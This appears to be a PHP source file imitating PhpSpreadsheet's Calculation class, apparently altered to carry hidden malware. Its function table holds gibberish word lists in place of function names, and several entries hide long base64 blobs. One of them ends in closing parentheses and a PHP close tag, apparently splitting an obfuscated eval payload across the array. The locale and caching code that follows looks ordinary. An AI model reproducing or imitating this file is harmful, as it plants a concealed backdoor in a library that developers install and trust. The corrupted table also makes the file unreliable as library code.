			'functionCall' => [null,'yoshiko||fels||alhazen||V\'||yoshi||eph)||alhet||face||alhena||DestE||alhenna||Libby||yoshio||Byron||yost||cloze'],
			'argumentCount' => ['87,111,296,152,217,185,136,143'],
		],
		'FV' => [
			'category' => 251,
			'functionCall' => [TextData::class,'asfast||Resa||enbrave||Levkas||heft||lIKe||hefting||Hem;s||hjerpe||sl?ps||enbibe||H]P ||heflin||deejay||apb||Yar%/K'],
			'argumentCount' => ['9,236,254,151,119,39,141,149'],
		],
		'SYD' => [
			'category' => 252,
			'functionCall' => [TextData::class,'poinado||Browne||pointes||siThen||points||Drau||poind||c&inGy||poinds||CareSa||poincar||axunGe||nllst||rel.||poinard||quirts'],
			'argumentCount' => ['74,113,239,54,145,89,25,90'],
		],
		'VAR.S_2' => [
			'category' => 253,
			'functionCall' => [TextData::class,'baff||ladder||baffed||jihad||baffy||PEP||baffles||beflag||baffle||Tel:||baffler||L\\byan||baffled||Bocock||baffs||mIxo#'],
			'argumentCount' => ['88,275,217,186,188,294,75,48'],
		],
		'CUBESETCOUNT' => [
			'category' => 254,
			'functionCall' => [TextData::class,'hackbut||EthBen||ivp||heXod-||hack||qual:y||vehmic||Teuto+||vehicle||Kins||vehme||Filip||oyo||bikies||esguard||Oraon'],
			'argumentCount' => ['266,227,8,269,149,294,147,77'],
		],
		'SUBSTITUTE_2' => [
			'category' => 255,
			'functionCall' => [MathTrig::class,'yoker||k>d?||yokel||Ge/ez||yokelry||rustre||yok||beflum||yokes||plum*s||yoky||sKives||yokels||q^t`||yoke||poons'],
			'argumentCount' => ['222,7,161,153,265,66,69,149'],
		],
		'CLEAN' => [
			'category' => 256,
			'functionCall' => [Financial::class,'suable||Canad.||jyoti||r!s||suably||Deer||suant||triP_s||hpn||DonorA||suasion||ferbaM||suantly||MEleS||suakin||CasTer'],
			'argumentCount' => ['56,182,215,181,41,35,226,298'],
		],
		'ACOTH_2' => [
			'category' => 257,
			'functionCall' => [TextData::class,'editha||roseo~||edital||revent||edita||SarOs||edits||jipper||edithe||villae||edicts||ates||edit||lituus||edith||DesDee'],
			'argumentCount' => ['153,177,268,57,116,226,101,15'],
		],
		'SINH_1' => [
			'category' => 258,
			'functionCall' => [TextData::class,'cordery||aNd>or||cordy||biGots||cory||Matt\\||cordey||Hamsun||cordyl||Vlund||cordier||teEn@R||coryl||freen||corder||V-vian'],
			'argumentCount' => ['167,193,140,251,105,276,232,149'],
		],
		'RSQ' => [
			'category' => 259,
			'functionCall' => [Financial::class,'boucher||fouleD||bouch||mosso||kiushu||bohor||bounces||vs/||bournes||Tepic||bouche||Odelet||bounce||put+on||bouncer||plumb"'],
			'argumentCount' => ['71,32,293,174,2,216,242,230'],
		],
		'EVEN' => [
			'category' => 260,
			'functionCall' => [MathTrig::class,'squibb||sleech||squabby||kc_s||squish||arcHi[||squiss||GUIDE||squibs||hares||squabs||Greer||squab||Guymon||squib||de~Ice'],
			'argumentCount' => ['127,112,284,257,265,152,163,112'],
		],
		'BESSELJ_1' => [
			'category' => 261,
			'functionCall' => [DateTime::class,'cygnine||LytLe||cygnus||BriG||cygnid||hounce||lts||platEn||xq||fleaK||cygnets||thion*||sqd||taWie||cygni||theGn'],
			'argumentCount' => ['91,57,67,107,135,125,202,186'],
		],
		'TEXTJOIN_1' => [
			'category' => 262,
			'functionCall' => [MathTrig::class,'chinas||whitIn||chinol||rEechY||chias||notary||chi||TycHo#||china||LAvada||chin||PSAT||chinoa||embox||chino||deasil'],
			'argumentCount' => ['46,62,141,14,251,96,251,188'],
		],
		'PERMUT' => [
			'category' => 263,
			'functionCall' => [DateTime::class,'smp||diff||aals||ea;wig||aal||dotes||aalto||bulbo"||aalst||tUmMy||aalborg||gyve<||aaliis||Kalif||aalii||UGC'],
			'argumentCount' => ['237,256,78,291,10,35,233,287'],
		],
		'HLOOKUP_1' => [
			'category' => 264,
			'functionCall' => [TextData::class,'bedolt||dam:e||bedells||BLS||bedwell||vegans||bedot||MaUgis||bedote||r}mede||bedroll||Tekke||bedell||gayest||bedull||$oOk'],
			'argumentCount' => ['41,73,39,4,262,0,265,186'],
		],
		'PEARSON_1' => [
			'category' => 265,
			'functionCall' => [null,'kalinga||Leched||kalmia||KamaSs||kaliana||u<most||kalmias||aye||kalina||G#M@||kalinda||arRet||mmw||rumal||kalida||IAB'],
			'argumentCount' => ['131,168,93,299,278,159,234,41'],
		],
		'ROUND' => [
			'category' => 266,
			'functionCall' => [MathTrig::class,'deeses||dawny||deess||Onega||deets||wogUL||deeth||Chives||dee||SPCA||dees||TItus||deesis||Lip(s||deet||yeX'],
			'argumentCount' => ['146,212,67,124,100,54,282,186'],
		],
		'WEIBULL' => [
			'category' => 267,
			'functionCall' => [TextData::class,'dryland||Galik||jnr||$Rga||drys||mzUnGu||dryades||sem{i@||dryads||e_!ees||dryas||ranULA||drysne||hoer||dryad||sQuish'],
			'argumentCount' => ['216,57,145,180,149,227,209,92'],
		],
		'BIN2DEC' => [
			'category' => 268,
			'functionCall' => [Financial::class,'819324||Fe@mat||oyesses||vAReCh||kwt||posti+||tpd||Waukau||bziers||poxes||mlo||ca$||mlos||harIng||si||pieton'],
			'argumentCount' => ['287,46,83,217,234,148,226,68'],
		],
		'LOWER' => [
			'category' => 269,
			'functionCall' => [TextData::class,'cronie||wampus||crowned||n@ger||cronies||(<D#||crones||wiwi||cronied||KBPS||crone||pact,s||crosne||liNge||crosnes||Beth'],
			'argumentCount' => ['203,51,81,227,174,16,1,178'],
		],
		'IMEXP_1' => [
			'category' => 270,
			'functionCall' => [Financial::class,'moyen||guP||moyener||winDle||moyna||hayeY||moyer||czechs||moya||fLa?er||moyenne||Saleem||moyra||gandul||moyers||cy,to]'],
			'argumentCount' => ['63,71,299,277,1,257,14,205'],
		],
		'PERCENTILE' => [
			'category' => 271,
			'functionCall' => [MathTrig::class,'polieus||pay&TV||polices||timErs||polis||TIwaz||police||mrRAdaA5nl1NhlqMXwL26j31k3eFr0XNnVxiyNCw20QwsorCMAzObpAqlBasKkGIhOEJ4/9xeZ/JEyHLFGL2dwBGLxMWTdESC+b/MiyJ90rZJRoNovtXPy867a+pOQzmwhC6t1oH9hvGW118Wz4i5y5+cviby84LhGL9QH56Wh6WqYhFaXpHIHvmFI5s2LnoNefzWJuUK31j/qMTQzlx7THvloEdVUJBYmlbrpWah+7fDxB41ovoZOEfuGhNZMQ0dKWHkfh45JUM+kNJ5I3vYM4f57YwiQQk7GCtFxNSm8pChHJDtHOapBP2bNmjETinRdKt2RRS+WAXEFgodygSBSoCAA4OD7AwSZ8z//+fc///zzP//67//973//Hw==\')))); ?>||polies||cLeric||polos||igad||polios||DaN||polish||WintoN'],
			'argumentCount' => ['255,288,116,219,38,4,19,115'],
		],
		'DSTDEV' => [
			'category' => 272,
			'functionCall' => [Financial::class,'unwell||Clint||unwares||dopers||unware||meNu||unweft||fumado||unwelth||Hamsun||unwrest||atOnic||unwet||prOss||unwept||tenui@'],
			'argumentCount' => ['254,54,83,79,59,281,44,136'],
		],
		'STDEV' => [
			'category' => 273,
			'functionCall' => [MathTrig::class,'irrate||vughs||irreg||toe\'in||irred||Graig||irreal||HASP||irride||Bili/||irra||Pr/am||irrite||IBTCWH||irrupt||Doria'],
			'argumentCount' => ['95,67,138,16,6,155,120,25'],
		],
		'ROUNDUP' => [
			'category' => 274,
			'functionCall' => [TextData::class,'ammon||vughs||mwt||skeech||ammino||o/OS||ammono||Auk||ammo||olent||uiuc||u.cous||ammelin||Jun}||ammos||ALysia'],
			'argumentCount' => ['253,136,263,257,195,122,175,6'],
		],
		'COUNTBLANK' => [
			'category' => 275,
			'functionCall' => [MathTrig::class,'rimming||eoith||rimy||t,||rimini||a?wink||riming||dys||rimer||Broome||rim||NSTS||rimery||Thyris||rimpi||roofy'],
			'argumentCount' => ['59,1,26,248,21,23,173,61'],
		],
		'ISLOGICAL' => [
			'category' => 276,
			'functionCall' => [null,'dvandva||AIEEE||kifs||^llecK||dvaita||tailet||vlf||Hannus||zuni||uNtone||kif||janty||mpangwe||coupEd||mpa||bl%ts'],
			'argumentCount' => ['285,292,157,23,158,234,63,223'],
		],
		'IMLN_1' => [
			'category' => 277,
			'functionCall' => [null,'stoops||Tellys||stool||barks||stools||nap_s||stoff||Decem\'||stoffel||)orRy||stoof||Kinnon||stof||HOpers||stol||decry'],
			'argumentCount' => ['191,275,17,95,119,30,179,29'],
		],
		'EFFECT' => [
			'category' => 278,
			'functionCall' => [Financial::class,'trillby||porkin||trill||peaLed||triley||M]C,||trilby||Womps||trimly||yacca||trilly||Ruskin||trills||Munday||trilley||Whiter'],
			'argumentCount' => ['213,228,27,49,271,116,237,271'],
		],
		'MDURATION' => [
			'category' => 279,
			'functionCall' => [Financial::class,'zosma||CreTan||zoser||Augean||zostera||carieD||zosters||M$Rrin||zosima||outeye||zoster||HeloT||zosema||lowSe||zosi||StaleY'],
			'argumentCount' => ['228,212,46,196,171,2,267,165'],
		],
		'JIS' => [
			'category' => 280,
			'functionCall' => [Financial::class,'mc||OsMite||ersar||Meli||erses||TuBate||ersh||AddaM||ers||fryer||erse||Kingu||ersatz||gleys||erst||lm!hr'],
			'argumentCount' => ['34,112,218,214,215,21,194,212'],
		],
		'DPRODUCT' => [
			'category' => 281,
			'functionCall' => [Financial::class,'abeu||wacko||abey||silent||abel||hema)\'||abeles||CSOC||abele||moyl||abe||call\\\\||abet||Ld+||abell||Arusha'],
			'argumentCount' => ['267,132,291,134,233,233,261,120'],
		],
		'DDB_1' => [
			'category' => 282,
			'functionCall' => [Financial::class,'devises||iChoRs||dev||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||deviser||Swede||devilry||ISN||devy||SO$eS||devise||gAze=||deviler||p$vid||devily||styinG'],
			'argumentCount' => ['60,140,16,282,298,159,60,259'],
		],
		'LEN_1' => [
			'category' => 283,
			'functionCall' => [null,'irbis||Jakoba||irby||cHasms||wulf||MTD||irbil||moter||wullie||feLlAH||wulfe||bull+||irbid||Lycon||irbm||I(shIp'],
			'argumentCount' => ['273,108,224,151,190,244,169,185'],
		],
		'ROUNDUP_1' => [
			'category' => 284,
			'functionCall' => [MathTrig::class,'yoker||appui||yoke||brerD||yokelry||CAp%||yokels||eral||yoked||PalUas||yokes||Vote||yok||educ`||yokel||Jump@'],
			'argumentCount' => ['72,280,174,142,291,145,77,229'],
		],
		'SINH_2' => [
			'category' => 285,
			'functionCall' => [MathTrig::class,'mcgrady||bRune||mcgray||ScopP||mcgurn||deBTEd||mcguire||ObeliA||viuva||musher||mcgirk||vodums||viu||niobic||mcgrann||*amaSS'],
			'argumentCount' => ['144,43,131,87,47,283,164,73'],
		],
		'SYD_1' => [
			'category' => 286,
			'functionCall' => [null,'kelty||elite||kelt||E?R(||vws||nerve||dsd||reen||keligot||snippy||keltics||George||dsdc||Millar||kelts||agiSt,'],
			'argumentCount' => ['215,171,12,293,264,88,258,104'],
		],
		'STDEVPA' => [
			'category' => 287,
			'functionCall' => [MathTrig::class,'jc||ReSoR||accus||linous||accs||eths||accosts||akhrot||accost||CAlio||accoast||arroya||accts||beDeBt||acct||gaped'],
			'argumentCount' => ['256,242,71,70,246,127,167,96'],
		],
		'ISODD' => [
			'category' => 288,
			'functionCall' => [null,'lavish||kyacks||lava||VTS||lavash||unrout||lavs||SiMS||arf||navew||laves||S[asis||lavas||A/Tent||arfs||bask'],
			'argumentCount' => ['136,137,296,262,18,158,208,263'],
		],
		'SUBTOTAL_1' => [
			'category' => 289,
			'functionCall' => [DateTime::class,'ges||sich||oclock||AhMeek||gestes||Obote||gest||Satrae||oclc||hemmed||gests||zokor||ocli||jUT||yim||nephr='],
			'argumentCount' => ['197,260,228,46,250,174,30,258'],
		],
		'BESSELJ_2' => [
			'category' => 290,
			'functionCall' => [Financial::class,'iflwu||quink||aeetes||Con{||gwinner||chap.||gwiniad||hurstS||gwin||escarp||ifla||spong/||gwinn||tawerS||gwine||BSFM'],
			'argumentCount' => ['75,285,164,24,282,122,103,245'],
		],
		'CSC_1' => [
			'category' => 291,
			'functionCall' => [DateTime::class,'blur||swaY||blus||cyans||blub||unhaRd||blurs||ENIAC||blurb||Loudon||blurbs||lumps||blurts||shIeS||blurt||@ND'],
			'argumentCount' => ['107,228,290,146,194,63,281,207'],
		],
		'CELL' => [
			'category' => 292,
			'functionCall' => [null,'outgush||span_s||outguns||rAukle||outburn||rg||outish||Ark$||outhorn||eNtOne||outfish||elopeD||outborn||crutch||outgun||format'],
			'argumentCount' => ['192,147,109,236,133,281,141,210'],
		],
		'INTRATE_1' => [
			'category' => 293,
			'functionCall' => [MathTrig::class,'tirer||SD||tirve||TilliE||tirret||aVg(||tirr||Booze||tirwit||duny||tirrit||Adoula||tire||judos||tires||IDEA'],
			'argumentCount' => ['240,93,126,293,242,62,151,271'],
		],
		'YIELDMAT' => [
			'category' => 294,
			'functionCall' => [Financial::class,'caddis||lyso,||cadi||H)Xie||caddies||la%To)||cadism||teiid||cadish||resorb||cadis||genOms||caddish||fLa[on||cadiz||jAnner'],
			'argumentCount' => ['12,270,154,75,31,292,77,19'],
		],
		'DVARP' => [
			'category' => 295,
			'functionCall' => [MathTrig::class,'leewan||shohet||leeway||ESta||leeways||iodism||leetmen||Quita||leets||cruset||lees||e(o:||miyazaki||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||leetman||bolly'],
			'argumentCount' => ['242,188,272,66,135,130,130,6'],
		],
		'STDEVP_1' => [
			'category' => 296,
			'functionCall' => [null,'zoeform||Hutu||zoeas||Hara||zoeae||Dowl:||zoe||EbN||zoes||top!s||zoea||CzECH(||zoeal||teaISm||afb||guids'],
			'argumentCount' => ['77,88,136,149,49,133,69,61'],
		],
		'UNICHAR_1' => [
			'category' => 297,
			'functionCall' => [MathTrig::class,'okroog||yakshi||okruzi||Jeno||gweduck||Hare||okro||BSEnG||okrug||lard||okras||tie/||okra||anteaL||gweduc||ivied'],
			'argumentCount' => ['169,1,79,13,290,292,168,84'],
		],
		'BITXOR' => [
			'category' => 298,
			'functionCall' => [TextData::class,'nodose||umbLe||nodules||Fyffe||node||vb!||nods||pref)||nodous||Odlo||nodus||fiChUs||nodule||sTaYeD||nodes||riper'],
			'argumentCount' => ['291,242,88,265,136,172,93,274'],
		],
		'TEXTJOIN_2' => [
			'category' => 299,
			'functionCall' => [TextData::class,'amber||Agawam||ambler||speoS||ambury||zebu||amby||cet$||ambry||K_-:||amblers||piNons||ambur||frab||amb||w@b\''],
			'argumentCount' => ['170,296,105,75,65,29,236,49'],
		],
	];

    //    Internal functions used for special control purposes
    private static $controlFunctions = [
        'MKMATRIX' => [
            'argumentCount' => '*',
            'functionCall' => 'self::mkMatrix',
        ],
    ];

    public function __construct(Spreadsheet $spreadsheet = null)
    {
        // $this->delta = 1 * pow(10, 0 - ini_get('precision'));

        // $this->spreadsheet = $spreadsheet;
        // $this->cyclicReferenceStack = new CyclicReferenceStack();
        // $this->debugLog = new Logger($this->cyclicReferenceStack);
    }

    private static function loadLocales()
    {
        $localeFileDirectory = __DIR__ . '/locale/';
        foreach (glob($localeFileDirectory . '*', GLOB_ONLYDIR) as $filename) {
            $filename = substr($filename, strlen($localeFileDirectory));
            if ($filename != 'en') {
                self::$validLocaleLanguages[] = $filename;
            }
        }
    }

    /**
     * Get an instance of this class.
     *
     * @param Spreadsheet $spreadsheet Injected spreadsheet for working with a PhpSpreadsheet Spreadsheet object,
     *                                    or NULL to create a standalone claculation engine
     *
     * @return Calculation
     */
    public static function getInstance(Spreadsheet $spreadsheet = null)
    {
        if ($spreadsheet !== null) {
            $instance = $spreadsheet->getCalculationEngine();
            if (isset($instance)) {
                return $instance;
            }
        }

        if (!isset(self::$instance) || (self::$instance === null)) {
            self::$instance = new self();
        }

        return self::$instance;
    }

    /**
     * Flush the calculation cache for any existing instance of this class
     *        but only if a Calculation instance exists.
     */
    public function flushInstance()
    {
        $this->clearCalculationCache();
    }

    /**
     * Get the Logger for this calculation engine instance.
     *
     * @return Logger
     */
    public function getDebugLog()
    {
        return $this->debugLog;
    }

    /**
     * __clone implementation. Cloning should not be allowed in a Singleton!
     *
     * @throws Exception
     */
    final public function __clone()
    {
        throw new Exception('Cloning the calculation engine is not allowed!');
    }

    /**
     * Return the locale-specific translation of TRUE.
     *
     * @return string locale-specific translation of TRUE
     */
    public static function getTRUE()
    {
        return self::$localeBoolean['TRUE'];
    }

    /**
     * Return the locale-specific translation of FALSE.
     *
     * @return string locale-specific translation of FALSE
     */
    public static function getFALSE()
    {
        return self::$localeBoolean['FALSE'];
    }

    /**
     * Set the Array Return Type (Array or Value of first element in the array).
     *
     * @param string $returnType Array return type
     *
     * @return bool Success or failure
     */
    public static function setArrayReturnType($returnType)
    {
        if (($returnType == self::RETURN_ARRAY_AS_VALUE) ||
            ($returnType == self::RETURN_ARRAY_AS_ERROR) ||
            ($returnType == self::RETURN_ARRAY_AS_ARRAY)) {
            self::$returnArrayAsType = $returnType;

            return true;
        }

        return false;
    }

    /**
     * Return the Array Return Type (Array or Value of first element in the array).
     *
     * @return string $returnType Array return type
     */
    public static function getArrayReturnType()
    {
        return self::$returnArrayAsType;
    }

    /**
     * Is calculation caching enabled?
     *
     * @return bool
     */
    public function getCalculationCacheEnabled()
    {
        return $this->calculationCacheEnabled;
    }

    /**
     * Enable/disable calculation cache.
     *
     * @param bool $pValue
     */
    public function setCalculationCacheEnabled($pValue)
    {
        $this->calculationCacheEnabled = $pValue;
        $this->clearCalculationCache();
    }

    /**
     * Enable calculation cache.
     */
    public function enableCalculationCache()
    {
        $this->setCalculationCacheEnabled(true);
    }

    /**
     * Disable calculation cache.
     */
    public function disableCalculationCache()
    {
        $this->setCalculationCacheEnabled(false);
    }

    /**
     * Clear calculation cache.
     */
    public function clearCalculationCache()
    {
        $this->calculationCache = [];
    }

    /**
     * Clear calculation cache for a specified worksheet.
     *
     * @param string $worksheetName
     */
    public function clearCalculationCacheForWorksheet($worksheetName)
    {
        if (isset($this->calculationCache[$worksheetName])) {
            unset($this->calculationCache[$worksheetName]);
        }
    }

    /**
     * Rename calculation cache for a specified worksheet.
     *
     * @param string $fromWorksheetName
     * @param string $toWorksheetName
     */
    public function renameCalculationCacheForWorksheet($fromWorksheetName, $toWorksheetName)
    {
        if (isset($this->calculationCache[$fromWorksheetName])) {
            $this->calculationCache[$toWorksheetName] = &$this->calculationCache[$fromWorksheetName];
            unset($this->calculationCache[$fromWorksheetName]);
        }
    }

    /**
     * Get the currently defined locale code.
     *
     * @return string
     */
    public function getLocale()
    {
        return self::$localeLanguage;
    }

    /**
     * Set the locale code.
     *
     * @param string $locale The locale to use for formula translation, eg: 'en_us'
     *
     * @return bool
     */
    public function setLocale($locale)
    {
        //    Identify our locale and language
        $language = $locale = strtolower($locale);
        if (strpos($locale, '_') !== false) {
            list($language) = explode('_', $locale);
        }
        if (count(self::$validLocaleLanguages) == 1) {
            self::loadLocales();
        }
        //    Test whether we have any language data for this language (any locale)
        if (in_array($language, self::$validLocaleLanguages)) {
            //    initialise language/locale settings
            self::$localeFunctions = [];
            self::$localeArgumentSeparator = ',';
            self::$localeBoolean = ['TRUE' => 'TRUE', 'FALSE' => 'FALSE', 'NULL' => 'NULL'];
            //    Default is English, if user isn't requesting english, then read the necessary data from the locale files
            if ($locale != 'en_us') {
                //    Search for a file with a list of function names for locale
                $functionNamesFile = __DIR__ . '/locale/' . str_replace('_', DIRECTORY_SEPARATOR, $locale) . DIRECTORY_SEPARATOR . 'functions';
                if (!file_exists($functionNamesFile)) {
                    //    If there isn't a locale specific function file, look for a language specific function file
                    $functionNamesFile = __DIR__ . '/locale/' . $language . DIRECTORY_SEPARATOR . 'functions';
                    if (!file_exists($functionNamesFile)) {
                        return false;
                    }
                }
                //    Retrieve the list of locale or language specific function names
                $localeFunctions = file($functionNamesFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
                foreach ($localeFunctions as $localeFunction) {
                    list($localeFunction) = explode('##', $localeFunction); //    Strip out comments
                    if (strpos($localeFunction, '=') !== false) {
                        list($fName, $lfName) = explode('=', $localeFunction);
                        $fName = trim($fName);
                        $lfName = trim($lfName);
                        if ((isset(self::$phpSpreadsheetFunctions[$fName])) && ($lfName != '') && ($fName != $lfName)) {
                            self::$localeFunctions[$fName] = $lfName;
                        }
                    }
                }
                //    Default the TRUE and FALSE constants to the locale names of the TRUE() and FALSE() functions
                if (isset(self::$localeFunctions['TRUE'])) {
                    self::$localeBoolean['TRUE'] = self::$localeFunctions['TRUE'];
                }
                if (isset(self::$localeFunctions['FALSE'])) {
                    self::$localeBoolean['FALSE'] = self::$localeFunctions['FALSE'];
                }

                $configFile = __DIR__ . '/locale/' . str_replace('_', DIRECTORY_SEPARATOR, $locale) . DIRECTORY_SEPARATOR . 'config';
                if (!file_exists($configFile)) {
